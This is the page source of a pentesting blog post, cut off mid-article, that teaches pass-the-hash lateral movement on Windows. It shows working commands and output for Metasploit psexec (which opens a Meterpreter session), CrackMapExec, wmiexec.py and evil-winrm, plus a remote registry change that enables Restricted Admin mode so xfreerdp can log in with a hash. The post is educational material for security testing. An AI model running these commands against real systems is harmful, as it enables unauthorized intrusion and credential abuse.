<html lang="en-US"><!--<![endif]--><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><![endif]-->
<link rel="profile" href="http://gmpg.org/xfn/11">
<title>Alternative ways to Pass the Hash (PtH) – n00py Blog</title>
<meta name="robots" content="max-image-preview:large">
<link rel="dns-prefetch" href="//platform.twitter.com">
<link rel="dns-prefetch" href="//fonts.googleapis.com">
<link rel="alternate" type="application/rss+xml" title="n00py Blog » Feed" href="https://www.n00py.io/feed/">
<link rel="alternate" type="application/rss+xml" title="n00py Blog » Comments Feed" href="https://www.n00py.io/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="n00py Blog » Alternative ways to Pass the Hash (PtH) Comments Feed" href="https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/feed/">
<script type="text/javascript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.n00py.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.1.6"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(p&&p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
</script><script src="https://www.n00py.io/wp-includes/js/wp-emoji-release.min.js?ver=6.1.6" type="text/javascript" defer=""></script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="wp-block-library-css" href="https://www.n00py.io/wp-includes/css/dist/block-library/style.min.css?ver=6.1.6" type="text/css" media="all">
<link rel="stylesheet" id="classic-theme-styles-css" href="https://www.n00py.io/wp-includes/css/classic-themes.min.css?ver=1" type="text/css" media="all">
<style id="global-styles-inline-css" type="text/css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="mt-shcore-style-css" href="https://www.n00py.io/wp-content/plugins/syntax-highlighter-mt/styles/shCore.css?ver=2.2.5" type="text/css" media="all">
<link rel="stylesheet" id="mt-theme-style-css" href="https://www.n00py.io/wp-content/plugins/syntax-highlighter-mt/styles/shThemeMidnight.css?ver=2.2.5" type="text/css" media="all">
<link rel="stylesheet" id="blackoot-css" href="https://www.n00py.io/wp-content/themes/blackoot-lite/css/blackoot.min.css?ver=1.1.21" type="text/css" media="all">
<link rel="stylesheet" id="blackoot-style-css" href="https://www.n00py.io/wp-content/themes/blackoot-lite/style.css?ver=1.1.21" type="text/css" media="all">
<link rel="stylesheet" id="font-awesome-css" href="https://www.n00py.io/wp-content/themes/blackoot-lite/css/font-awesome/css/font-awesome.min.css?ver=1.1.21" type="text/css" media="all">
<link rel="stylesheet" id="blackoot-webfonts-css" href="//fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,400,700|Quicksand:400italic,700italic,400,700&amp;subset=latin,latin-ext" type="text/css" media="all">
<script type="text/javascript" src="https://www.n00py.io/wp-content/plugins/syntax-highlighter-mt/scripts/shCore.js?ver=2.2.5" id="mt-shcore-js"></script>
<script type="text/javascript" src="https://www.n00py.io/wp-content/plugins/syntax-highlighter-mt/scripts/shAutoloader.js?ver=2.2.5" id="mt-shautoloader-js"></script>
<script type="text/javascript" src="https://www.n00py.io/wp-includes/js/jquery/jquery.min.js?ver=3.6.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://www.n00py.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://www.n00py.io/wp-includes/js/hoverIntent.min.js?ver=1.10.2" id="hoverIntent-js"></script>
<script type="text/javascript" src="https://www.n00py.io/wp-content/themes/blackoot-lite/js/blackoot.min.js?ver=1.1.21" id="blackoot-js"></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='https://www.n00py.io/wp-content/themes/blackoot-lite/js/html5.js?ver=1.1.21' id='html5shiv-js'></script>
<![endif]-->
<link rel="https://api.w.org/" href="https://www.n00py.io/wp-json/"><link rel="alternate" type="application/json" href="https://www.n00py.io/wp-json/wp/v2/posts/11617"><meta name="generator" content="WordPress 6.1.6">
<link rel="canonical" href="https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/">
<link rel="shortlink" href="https://www.n00py.io/?p=11617">
<link rel="alternate" type="application/json+oembed" href="https://www.n00py.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.n00py.io%2F2020%2F12%2Falternative-ways-to-pass-the-hash-pth%2F">
<link rel="alternate" type="text/xml+oembed" href="https://www.n00py.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.n00py.io%2F2020%2F12%2Falternative-ways-to-pass-the-hash-pth%2F&amp;format=xml">
<style type="text/css" id="custom-background-css">
body.custom-background { background-image: url("https://www.n00py.io/wp-content/themes/blackoot-lite/img/zwartevilt.png"); background-position: left top; background-size: auto; background-repeat: repeat; background-attachment: scroll; }
</style>
	<meta name="twitter:widgets:theme" content="dark"><meta name="twitter:widgets:link-color" content="#1e4a95"><meta name="twitter:widgets:border-color" content="#000000"><meta name="twitter:partner" content="tfwp"><link rel="icon" href="https://www.n00py.io/wp-content/uploads/2016/10/cropped-Snoopy-4-icon-32x32.png" sizes="32x32">
<link rel="icon" href="https://www.n00py.io/wp-content/uploads/2016/10/cropped-Snoopy-4-icon-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://www.n00py.io/wp-content/uploads/2016/10/cropped-Snoopy-4-icon-180x180.png">
<meta name="msapplication-TileImage" content="https://www.n00py.io/wp-content/uploads/2016/10/cropped-Snoopy-4-icon-270x270.png">

<meta name="twitter:card" content="summary"><meta name="twitter:title" content="Alternative ways to Pass the Hash (PtH)"><meta name="twitter:site" content="@n00py1"><meta name="twitter:description" content="Do you remember the first time you passed the hash?&nbsp; It probably went a little something like this: msf > use exploit/windows/smb/psexec msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c msf exploit(psexec) > exploit [*] Sending stage (719360 bytes) [*] Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1045) If you are unfamiliar, that is the…">
<script charset="utf-8" src="https://platform.twitter.com/js/button.856debeac157d9669cf51e73a08fbc93.js"></script><script charset="utf-8" src="https://platform.twitter.com/js/timeline.e108540dddc96e4b707f5cf259a582d7.js"></script></head>
<body class="post-template-default single single-post postid-11617 single-format-standard custom-background">

<div id="main-wrap">
	<div id="header-wrap">
		<div id="tophead-wrap">
			<div class="container">
				<div class="tophead">
					<form role="search" method="get" class="search-form" action="https://www.n00py.io/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search …" value="" name="s">
				</label>
				<input type="submit" class="search-submit" value="Search">
			</form>				</div>
			</div>
		</div>

		<div id="header">
			<div class="container">
				<div id="logo">
					<a href="https://www.n00py.io" title="n00py Blog" rel="home">
													<h1 class="site-title">n00py Blog</h1>
												</a>
				</div>
									<div id="tagline">/Users/n00py/</div>
								</div>
		</div>

		<div id="nav-wrap">
			<div id="navbar" class="container">
				<div class="menu"><ul>
<li><a href="https://www.n00py.io/">Home</a></li><li class="page_item page-item-602"><a href="https://www.n00py.io/defense/">Defense</a></li>
<li class="page_item page-item-16"><a href="https://www.n00py.io/github/">Github</a></li>
<li class="page_item page-item-61"><a href="https://www.n00py.io/linkedin/">LinkedIn</a></li>
<li class="page_item page-item-600"><a href="https://www.n00py.io/osx/">OSX</a></li>
<li class="page_item page-item-531"><a href="https://www.n00py.io/pentesting/">Pentesting</a></li>
<li class="page_item page-item-597"><a href="https://www.n00py.io/research/">Research</a></li>
<li class="page_item page-item-529"><a href="https://www.n00py.io/walkthroughs/">Walkthroughs</a></li>
<li class="page_item page-item-2"><a href="https://www.n00py.io/whoami/">whoami</a></li>
</ul></div>
			</div>
		</div>
	</div>
		<div id="page-title">
		<div class="container">
							<div id="breadcrumbs">
					<a href="https://www.n00py.io">Home</a><span class="separator"> / </span><a href="https://www.n00py.io/category/pentesting/" rel="tag">Pentesting</a><span class="separator"> / </span><a href="https://www.n00py.io/category/post-exploitation/" rel="tag">Post Exploitation</a><span class="separator"> / </span>Alternative ways to Pass the Hash (PtH)				</div>
							<h1>Alternative ways to Pass the Hash (PtH)</h1>
		</div>
	</div>
	<div class="container" id="main-content">
	<div id="page-container" class="with-sidebar">
						<div id="post-11617" class="single-post post-11617 post type-post status-publish format-standard hentry category-pentesting category-post-exploitation">
										<div class="postmetadata">
												<span class="entry-title hatom-feed-info">Alternative ways to Pass the Hash (PtH)</span>
												<span class="meta-date post-date updated"><i class="fa fa-calendar"></i><a href="https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/" title="Alternative ways to Pass the Hash (PtH)" rel="bookmark">
							December 13, 2020						</a></span>
												<span class="meta-author author vcard"><i class="fa fa-user"></i><a class="fn" href="https://www.n00py.io/author/n00py/" title="View all posts by n00py" rel="author">n00py</a></span>
												<div class="meta-category">
							<span class="category-icon" title="Category"><i class="fa fa-tag"></i></span>
							<a href="https://www.n00py.io/category/pentesting/">Pentesting</a><a href="https://www.n00py.io/category/post-exploitation/">Post Exploitation</a>						</div>
													<span class="meta-comments"><i class="fa fa-comment"></i>
								<a href="https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/#respond">0 Comment</a>							</span>
												</div>
										<div class="post-contents entry-content">
						<p>Do you remember the first time you <a href="https://attack.mitre.org/techniques/T1550/002/">passed the hash</a>?&nbsp; It probably went a little something like this:</p>
<div><div id="highlighter_620895" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">msf &gt; use exploit/windows/smb/psexec</code></div><div class="line number2 index1 alt1"><code class="plain plain">msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</code></div><div class="line number3 index2 alt2"><code class="plain plain">SMBPass =&gt; e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</code></div><div class="line number4 index3 alt1"><code class="plain plain">msf exploit(psexec) &gt; exploit</code></div><div class="line number5 index4 alt2"><code class="plain plain">[*] Sending stage (719360 bytes)</code></div><div class="line number6 index5 alt1"><code class="plain plain">[*] Meterpreter session 1 opened (192.168.57.133:443 -&gt; 192.168.57.131:1045)</code></div></div></td></tr></tbody></table></div></div>
<p>If you are unfamiliar, that is the <a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/">Metasploit PSexec</a> module being used.</p>
<p>Well, nowadays we don’t really do that anymore.&nbsp; You probably pass the hash something like this:</p>
<div><div id="highlighter_359943" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">cme smb 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79&nbsp; -d domain.local</code></div><div class="line number2 index1 alt1"><code class="plain plain">SMB &nbsp; &nbsp; &nbsp; &nbsp; 10.0.0.20 &nbsp; &nbsp; 445&nbsp; &nbsp; PC01&nbsp; &nbsp; &nbsp; [*] Windows Server 2012 R2 Standard 9600 x64 (name:PC01) (domain:domain.local) (signing:False) (SMBv1:True)</code></div><div class="line number3 index2 alt2"><code class="plain plain">SMB &nbsp; &nbsp; &nbsp; &nbsp; 10.0.0.20 &nbsp; &nbsp; 445&nbsp; &nbsp; PC01 &nbsp; &nbsp; &nbsp; [+] domain.local\user BD1C6503987F8FF006296118F359FA79 (Pwn3d!)</code></div></div></td></tr></tbody></table></div></div>
<p>That is <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> being used to pass the hash.&nbsp; As you may already know, CrackMapExec under the hood is mostly <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>. The default execution method is using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a>, which can be ran standalone with impacket using the following syntax:</p>
<div><div id="highlighter_659357" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79</code></div><div class="line number2 index1 alt1"><code class="plain plain">[*] SMBv3.0 dialect used</code></div><div class="line number3 index2 alt2"><code class="plain plain">[!] Launching semi-interactive shell - Careful what you execute</code></div><div class="line number4 index3 alt1"><code class="plain plain">[!] Press help for extra shell commands</code></div><div class="line number5 index4 alt2"><code class="plain plain">C:\&gt;</code></div></div></td></tr></tbody></table></div></div>
<p>You will find that basically all of impacket’s example scripts allow you to pass the hash.</p>
<p>What I want to talk about next is ways to pass the hash that might be new to you.</p>
<h1>WinRM</h1>
<p><strong>What:</strong> The short of it is that Windows Remote Management (<a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal">WinRM</a>) is another way to remotely manage computers aside from WMI and other similar protocols and uses a different set of ports.&nbsp; WinRM uses either port 5985 (HTTP) or 5986 (HTTPS).</p>
<p><strong>Why:</strong> Sometimes you will find that SMB is not open, or that some endpoint protection is preventing you from using your standard toolset.</p>
<p><strong>How:</strong> This can be done using a variety of tools including CrackMapExec, but right now I want to focus on <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> as it contains a lot of other features. Passing the hash with evil-winrm is easy, and it looks like so:</p>
<div><div id="highlighter_329940" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ruby evil-winrm.rb -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="plain plain">Evil-WinRM shell v2.3</code></div><div class="line number4 index3 alt1">&nbsp;</div><div class="line number5 index4 alt2"><code class="plain plain">Info: Establishing connection to remote endpoint</code></div><div class="line number6 index5 alt1">&nbsp;</div><div class="line number7 index6 alt2"><code class="plain plain">*Evil-WinRM* PS C:\Users\user\Documents&gt;</code></div></div></td></tr></tbody></table></div></div>
<p><strong>Resources:</strong></p>
<p><a href="https://pentestlab.blog/2018/05/15/lateral-movement-winrm/">https://pentestlab.blog/2018/05/15/lateral-movement-winrm/</a><br>
<a href="https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/">https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/</a></p>
<h1>RDP</h1>
<p><strong>What:</strong> Remote desktop is a program or an operating system feature that allows a user to connect to a computer in another location, see that computer’s desktop and interact with it as if it were local.</p>
<p><strong>Why:</strong> Often times during a penetration test you may want to access software installed on a user’s system that is only available through a graphic interface.&nbsp; This may be a password manager that can be exported easily via the GUI, or other software that can perform actions that would be impossible/burdensome to use otherwise.&nbsp; You may want to pass an NT hash of a user who couldn’t be cracked and take over their session.</p>
<p><strong>How:</strong> You can pass the hash using <a href="https://linux.die.net/man/1/xfreerdp">xfreerdp</a>.&nbsp; There is one important caveat however, and that is that this is only possible when the system has Restricted Admin Mode enabled.&nbsp; If this is not enabled and you try to PTH, you will get an error stating that “Account Restrictions are preventing this user from signing in.”&nbsp; Restricted Admin Mode is disabled by default.&nbsp; The good news is, if you have any level of admin access to the system and access to SMB/WinRM/etc, you can enable this feature remotely.</p>
<div><div id="highlighter_158327" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'</code></div><div class="line number2 index1 alt1"><code class="plain plain">SMB 10.0.0.200 445 DESKTOP [*] Windows 10.0 Build 18362 x64 (name:DESKTOP) (domain:DESKTOP) (signing:False) (SMBv1:False)</code></div><div class="line number3 index2 alt2"><code class="plain plain">SMB 10.0.0.200 445 DESKTOP [+] DESKTOP\Administrator 8846F7EAEE8FB117AD06BDD830B7586C (Pwn3d!)</code></div><div class="line number4 index3 alt1"><code class="plain plain">SMB 10.0.0.200 445 DESKTOP [+] Executed command</code></div><div class="line number5 index4 alt2"><code class="plain plain">SMB 10.0.0.200 445 DESKTOP The operation completed successfully.</code></div></div></td></tr></tbody></table></div></div>
<p>Once the registry key is set, you can then pass the hash with xfreerdp:</p>
<div><div id="highlighter_823184" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C</code></div></div></td></tr></tbody></table></div></div>
<p><strong>Resources:</strong></p>
<p><a href="https://www.kali.org/penetration-testing/passing-hash-remote-desktop/">https://www.kali.org/penetration-testing/passing-hash-remote-desktop/</a><br>
<a href="https://shellz.club/pass-the-hash-with-rdp-in-2019/">https://shellz.club/pass-the-hash-with-rdp-in-2019/</a><br>
<a href="https://labs.f-secure.com/blog/undisable/">https://labs.f-secure.com/blog/undisable/</a></p>
<h1>smbclient</h1>
<p><strong>What:</strong> <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">smbclient</a> is an FTP-like client to interact with SMB/CIFS resources.</p>
